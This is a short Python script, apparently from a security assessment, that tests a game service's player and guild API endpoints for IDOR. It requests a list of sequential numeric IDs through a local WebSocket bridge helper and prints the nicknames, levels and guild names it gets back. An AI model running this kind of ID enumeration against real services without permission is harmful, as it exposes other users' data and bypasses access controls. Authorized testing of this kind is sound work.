#!/usr/bin/env python3
"""Test IDOR on player/guild endpoints with numeric IDs."""
import json, sys, os, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import ws_bridge

ws_bridge.start(port=55004)

# Try various player public IDs and guild IDs
tests = [
    ("/api/players/1", "GET", None),
    ("/api/players/2", "GET", None),
    ("/api/players/10", "GET", None),
    ("/api/players/100", "GET", None),
    ("/api/players/1000", "GET", None),
    ("/api/players/10375", "GET", None),
    ("/api/guilds/1", "GET", None),
    ("/api/guilds/2", "GET", None),
    ("/api/guilds/10", "GET", None),
    ("/api/guilds/100", "GET", None),
    ("/api/guilds/1000", "GET", None),
    ("/api/guilds/10013", "GET", None),
]

for path, method, body in tests:
    res = ws_bridge.request(method, path, body, timeout=15)
    status = res.get('status')
    data = res.get('data')
    if status == 200:
        # Summarize
        if isinstance(data, dict):
            keys = list(data.keys())[:5]
            print(f"200 {path} keys={keys}")
            if 'player' in data:
                p = data['player']
                print(f"    player: {p.get('publicId')} {p.get('nickname')} lvl={p.get('level')}")
            if 'guild' in data:
                g = data['guild']
                print(f"    guild: {g.get('publicId')} {g.get('name')}")
        else:
            print(f"200 {path} data={str(data)[:100]}")
    else:
        code = data.get('error',{}).get('code') if isinstance(data,dict) else None
        print(f"{status} {path} [{code}]")
    time.sleep(0.5)
